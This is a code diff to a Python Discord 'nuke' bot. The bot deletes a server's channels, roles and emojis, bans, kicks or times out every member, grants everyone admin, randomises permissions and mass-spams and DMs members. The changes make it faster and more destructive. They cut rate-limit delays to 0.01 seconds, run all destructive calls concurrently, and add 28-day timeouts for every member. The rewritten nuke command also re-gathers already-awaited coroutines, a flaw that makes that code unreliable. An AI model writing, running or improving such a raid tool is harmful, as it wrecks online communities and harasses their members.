@@ -14,7 +14,7 @@ import random
 class Config:
     # ===== BOT SETTINGS =====
     TOKEN = ""  # Your bot token from Discord Developer Portal
-    PREFIX = "."  # The prefix to use before commands (e.g. .nuke)
+    PREFIX = "!"  # The prefix to use before commands (e.g. !nuke), you can also delete the prefix if you don't want one
     WHITELIST = []  # List of user IDs who can use the bot commands
 
     # ===== MESSAGE SETTINGS =====
@@ -26,7 +26,7 @@ class Config:
     # ===== CHANNEL SETTINGS =====
     CHANNEL_NAME = "nuked"  # Base name for created text channels
     CHANNELS_COUNT = 10  # How many text channels to create
-    NEW_CHANNEL_NAME = "renamed-nuked"  # Name pattern when renaming existing channels
+    NEW_CHANNEL_NAME = "nuked"  # Name pattern when renaming existing channels
     VOICE_CHANNELS_COUNT = 10  # How many voice channels to create
     VOICE_CHANNEL_NAME = "NUKED"  # Base name for created voice channels
     CATEGORY_NAME = "NUKED"  # Base name for created categories
@@ -39,19 +39,19 @@ class Config:
     # ===== ROLE SETTINGS =====
     ROLE_NAME = "nuked"  # Base name for created roles
     ROLES_COUNT = 10  # How many roles to create
-    NEW_ROLE_NAME = "renamed-nuked"  # Name pattern when renaming existing roles
+    NEW_ROLE_NAME = "nuked"  # Name pattern when renaming existing roles
     ADMIN_ROLE_NAME = "ADMIN"  # Name of the admin role given to everyone
 
     # ===== SERVER SETTINGS =====
     SERVER_NAME = "NUKED SERVER"  # New name for the server
     SERVER_ICON_URL = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Nuke%20Bot/server-icon.jpg"  # URL of new server icon
-    NICKNAME = "NUKED_LOSER"  # New nickname for all members
+    NICKNAME = "NUKED"  # New nickname for all members
     TIMEOUT_DURATION = 28  # Timeout duration in days for all members, anything above 28 will not work
 
     # ===== WEBHOOK SETTINGS =====
-    WEBHOOK_NAME = "NUKED_WEBHOOK"  # Base name for created webhooks
+    WEBHOOK_NAME = "NUKED"  # Base name for created webhooks
     WEBHOOK_COUNT = 10  # How many webhooks to create per channel
-    WEBHOOK_RENAME = "RENAMED_NUKED_WEBHOOK"  # Name pattern when renaming webhooks
+    WEBHOOK_RENAME = "NUKED"  # Name pattern when renaming webhooks
 
     # ===== INVITE SETTINGS =====
     INVITE_COUNT = 10  # How many invite links to create per channel
@@ -119,8 +119,8 @@ async def cchannels(ctx, count: int = config.CHANNELS_COUNT):
     count = max(1, min(count, 50))
     for i in range(count):
         try:
-            await ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}-{i}")
-            await asyncio.sleep(0.5)
+            await ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}")
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -130,8 +130,8 @@ async def cvoice(ctx, count: int = config.VOICE_CHANNELS_COUNT):
     count = max(1, min(count, 50))
     for i in range(count):
         try:
-            await ctx.guild.create_voice_channel(f"{config.VOICE_CHANNEL_NAME}-{i}")
-            await asyncio.sleep(0.5)
+            await ctx.guild.create_voice_channel(f"{config.VOICE_CHANNEL_NAME}")
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -141,8 +141,8 @@ async def ccategory(ctx, count: int = config.CATEGORIES_COUNT):
     count = max(1, min(count, 10))
     for i in range(count):
         try:
-            await ctx.guild.create_category_channel(f"{config.CATEGORY_NAME}-{i}")
-            await asyncio.sleep(0.5)
+            await ctx.guild.create_category_channel(f"{config.CATEGORY_NAME}")
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -153,8 +153,8 @@ async def cthread(ctx, count: int = config.THREAD_COUNT):
     for channel in ctx.guild.text_channels:
         for i in range(count):
             try:
-                await channel.create_thread(name=f"{config.THREAD_NAME}-{i}", auto_archive_duration=60)
-                await asyncio.sleep(0.5)
+                await channel.create_thread(name=f"{config.THREAD_NAME}", auto_archive_duration=60)
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -164,9 +164,9 @@ async def cnsfw(ctx, count: int = config.CHANNELS_COUNT):
     count = max(1, min(count, 50))
     for i in range(count):
         try:
-            channel = await ctx.guild.create_text_channel(f"{config.NSFW_CHANNEL_NAME}-{i}")
+            channel = await ctx.guild.create_text_channel(f"{config.NSFW_CHANNEL_NAME}")
             await channel.edit(nsfw=True)
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -176,7 +176,7 @@ async def dchannels(ctx):
     for channel in ctx.guild.channels:
         try:
             await channel.delete()
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
     try:
@@ -190,7 +190,7 @@ async def dcategory(ctx):
     for category in ctx.guild.categories:
         try:
             await category.delete()
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -199,8 +199,8 @@ async def rchannels(ctx):
     if not is_whitelisted(ctx): return
     for i, channel in enumerate(ctx.guild.channels):
         try:
-            await channel.edit(name=f"{config.NEW_CHANNEL_NAME}-{i}")
-            await asyncio.sleep(0.5)
+            await channel.edit(name=f"{config.NEW_CHANNEL_NAME}")
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -210,7 +210,7 @@ async def nsfwall(ctx):
     for channel in ctx.guild.text_channels:
         try:
             await channel.edit(nsfw=True)
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -220,7 +220,7 @@ async def rtopics(ctx):
     for channel in ctx.guild.text_channels:
         try:
             await channel.edit(topic=random.choice(config.TOPICS))
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -231,7 +231,7 @@ async def slowmodeall(ctx, seconds: int = config.SLOWMODE_DURATION):
     for channel in ctx.guild.text_channels:
         try:
             await channel.edit(slowmode_delay=seconds)
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -241,8 +241,8 @@ async def croles(ctx, count: int = config.ROLES_COUNT):
     count = max(1, min(count, 50))
     for i in range(count):
         try:
-            await ctx.guild.create_role(name=f"{config.ROLE_NAME}-{i}")
-            await asyncio.sleep(0.5)
+            await ctx.guild.create_role(name=f"{config.ROLE_NAME}")
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -253,7 +253,7 @@ async def droles(ctx):
         if role.name != "@everyone" and not role.managed:
             try:
                 await role.delete()
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -264,9 +264,9 @@ async def rroles(ctx):
     for role in ctx.guild.roles:
         if role.name != "@everyone":
             try:
-                await role.edit(name=f"{config.NEW_ROLE_NAME}-{i}")
+                await role.edit(name=f"{config.NEW_ROLE_NAME}")
                 i += 1
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -278,7 +278,7 @@ async def adminall(ctx):
         for member in ctx.guild.members:
             try:
                 await member.add_roles(admin_role)
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.01)
             except:
                 pass
     except:
@@ -290,7 +290,7 @@ async def rnickall(ctx):
     for member in ctx.guild.members:
         try:
             await member.edit(nick=config.NICKNAME)
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -302,7 +302,7 @@ async def demoteall(ctx):
             roles_to_remove = [role for role in member.roles if role.name != "@everyone"]
             if roles_to_remove:
                 await member.remove_roles(*roles_to_remove)
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.01)
         except:
             pass
 
@@ -315,7 +315,7 @@ async def moveall(ctx):
             if member.voice:
                 try:
                     await member.move_to(vc)
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(0.01)
                 except:
                     pass
     except:
@@ -328,7 +328,7 @@ async def disconnectall(ctx):
         if member.voice:
             try:
                 await member.move_to(None)
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -339,7 +339,7 @@ async def banall(ctx):
         if member != ctx.author and member != bot.user:
             try:
                 await member.ban()
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -349,7 +349,7 @@ async def unbanall(ctx):
     async for entry in ctx.guild.bans():
         try:
             await ctx.guild.unban(entry.user)
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -360,7 +360,7 @@ async def kickall(ctx):
         if member != ctx.author and member != bot.user:
             try:
                 await member.kick()
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -372,7 +372,7 @@ async def timeoutall(ctx):
         if member != ctx.author and member != bot.user:
             try:
                 await member.timeout(timedelta(days=duration))
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -382,7 +382,7 @@ async def untimeoutall(ctx):
     for member in ctx.guild.members:
         try:
             await member.timeout(None)
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -393,7 +393,7 @@ async def spam(ctx, count: int = config.SPAM_COUNT):
     for _ in range(count):
         try:
             await ctx.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -405,7 +405,7 @@ async def mspam(ctx, count: int = config.SPAM_COUNT):
         for _ in range(count):
             try:
                 await channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -436,7 +436,7 @@ async def rpins(ctx):
             for message in pins:
                 try:
                     await message.unpin()
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(0.01)
                 except:
                     pass
         except:
@@ -448,8 +448,8 @@ async def cwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
     count = max(1, min(count, 10))
     for i in range(count):
         try:
-            await ctx.channel.create_webhook(name=f"{config.WEBHOOK_NAME}-{i}")
-            await asyncio.sleep(0.5)
+            await ctx.channel.create_webhook(name=f"{config.WEBHOOK_NAME}")
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -460,8 +460,8 @@ async def mwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
     for channel in ctx.guild.text_channels:
         for i in range(count):
             try:
-                await channel.create_webhook(name=f"{config.WEBHOOK_NAME}-{i}")
-                await asyncio.sleep(0.5)
+                await channel.create_webhook(name=f"{config.WEBHOOK_NAME}")
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -474,7 +474,7 @@ async def dwebhooks(ctx):
             for webhook in webhooks:
                 try:
                     await webhook.delete()
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(0.01)
                 except:
                     pass
         except:
@@ -488,8 +488,8 @@ async def rwebhooks(ctx):
             webhooks = await channel.webhooks()
             for i, webhook in enumerate(webhooks):
                 try:
-                    await webhook.edit(name=f"{config.WEBHOOK_RENAME}-{i}")
-                    await asyncio.sleep(0.5)
+                    await webhook.edit(name=f"{config.WEBHOOK_RENAME}")
+                    await asyncio.sleep(0.01)
                 except:
                     pass
         except:
@@ -503,7 +503,7 @@ async def cinvites(ctx, count: int = config.INVITE_COUNT):
         for _ in range(count):
             try:
                 await channel.create_invite()
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -514,7 +514,7 @@ async def dinvites(ctx):
     for invite in invites:
         try:
             await invite.delete()
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -524,7 +524,7 @@ async def demojis(ctx):
     for emoji in ctx.guild.emojis:
         try:
             await emoji.delete()
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -534,7 +534,7 @@ async def dstickers(ctx):
     for sticker in ctx.guild.stickers:
         try:
             await sticker.delete()
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -545,7 +545,7 @@ async def dmall(ctx):
         if member != bot.user:
             try:
                 await member.send(config.DM_MESSAGE)
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -557,7 +557,7 @@ async def chaoschannels(ctx):
     for position, channel in enumerate(channels):
         try:
             await channel.edit(position=position)
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -569,7 +569,7 @@ async def chaosroles(ctx):
     for position, role in enumerate(roles, start=1):
         try:
             await role.edit(position=position)
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -584,7 +584,7 @@ async def chaoschannelperms(ctx):
                 perms.view_channel = random.choice(config.CHAOS_PERMISSIONS)
                 perms.manage_messages = random.choice(config.CHAOS_PERMISSIONS)
                 await channel.set_permissions(role, overwrite=perms)
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -597,7 +597,7 @@ async def chaosroleperms(ctx):
                 perms = discord.Permissions()
                 perms.value = random.randint(0, 2147483647)
                 await role.edit(permissions=perms)
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.01)
             except:
                 pass
 
@@ -607,7 +607,7 @@ async def lockdown(ctx):
     for channel in ctx.guild.channels:
         try:
             await channel.set_permissions(ctx.guild.default_role, send_messages=False)
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
@@ -617,101 +617,53 @@ async def unlockall(ctx):
     for channel in ctx.guild.channels:
         try:
             await channel.set_permissions(ctx.guild.default_role, send_messages=None)
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
 
 @bot.command()
 async def nuke(ctx):
     if not is_whitelisted(ctx): return
-    try:
-        await ctx.message.delete()
-    except:
-        pass
     
-    try:
-        await ctx.guild.edit(name=config.SERVER_NAME)
-    except:
-        pass
+    guild = ctx.guild
     
+    tasks = []
+    tasks.append(guild.edit(name=config.SERVER_NAME))
+
     if config.SERVER_ICON_URL:
         icon_image = await download_image(config.SERVER_ICON_URL)
         if icon_image:
-            try:
-                await ctx.guild.edit(icon=icon_image)
-            except:
-                pass
-    
-    for channel in ctx.guild.channels:
-        try:
-            await channel.delete()
-            await asyncio.sleep(0.5)
-        except:
-            pass
-    
-    for role in ctx.guild.roles:
-        if role.name != "@everyone" and not role.managed:
-            try:
-                await role.delete()
-                await asyncio.sleep(0.5)
-            except:
-                pass
-    
-    for emoji in ctx.guild.emojis:
-        try:
-            await emoji.delete()
-            await asyncio.sleep(0.5)
-        except:
-            pass
-    
-    for sticker in ctx.guild.stickers:
-        try:
-            await sticker.delete()
-            await asyncio.sleep(0.5)
-        except:
-            pass
-    
-    try:
-        main_channel = await ctx.guild.create_text_channel(config.CHANNEL_NAME, topic="Nuked")
-    except:
-        main_channel = None
+            tasks.append(guild.edit(icon=icon_image))
+
+    tasks.extend(channel.delete() for channel in guild.channels)
+    tasks.extend(role.delete() for role in guild.roles if role.name != "@everyone" and not role.managed)
+    tasks.extend(sticker.delete() for sticker in guild.stickers)
+    tasks.extend(emoji.delete() for emoji in guild.emojis)
+    tasks.append(guild.create_text_channel(config.CHANNEL_NAME))
     
     for i in range(config.CHANNELS_COUNT):
-        try:
-            await ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}-{i}", topic=f"Channel {i}")
-            await asyncio.sleep(0.5)
-        except:
-            pass
+        tasks.append(guild.create_text_channel(f"{config.CHANNEL_NAME}"))
     
     for i in range(config.ROLES_COUNT):
-        try:
-            await ctx.guild.create_role(name=f"{config.ROLE_NAME}-{i}")
-            await asyncio.sleep(0.5)
-        except:
-            pass
+        tasks.append(guild.create_role(name=f"{config.ROLE_NAME}"))
     
-    for member in ctx.guild.members:
-        if member == bot.user:
-            continue
-        try:
-            if config.NICKNAME:
-                await member.edit(nick=config.NICKNAME)
-        except:
-            pass
-        try:
-            if config.DM_MESSAGE:
-                await member.send(config.DM_MESSAGE)
-                await asyncio.sleep(0.5)
-        except:
-            pass
+    for member in guild.members:
+        if member == bot.user: continue
+        if config.NICKNAME:
+            tasks.append(member.edit(nick=config.NICKNAME))
+        if config.DM_MESSAGE:
+            tasks.append(member.send(config.DM_MESSAGE))
+        if config.TIMEOUT_DURATION:
+            from datetime import timedelta
+            tasks.append(member.timeout(timedelta(days=config.TIMEOUT_DURATION)))
     
-    for channel in ctx.guild.text_channels:
+    await asyncio.gather(*tasks, return_exceptions=True)
+    
+    for channel in guild.text_channels:
         for _ in range(config.SPAM_COUNT):
-            try:
-                await channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
-                await asyncio.sleep(0.5)
-            except:
-                pass
+            tasks.append(channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH))
+    
+    await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
 async def whitelist(ctx):
@@ -725,7 +677,6 @@ async def whitelist(ctx):
 @bot.command()
 async def kill(ctx):
     if not is_whitelisted(ctx): return
-    await ctx.send("Bot shutting down...")
     await bot.close()
 
 @bot.command(name='help')
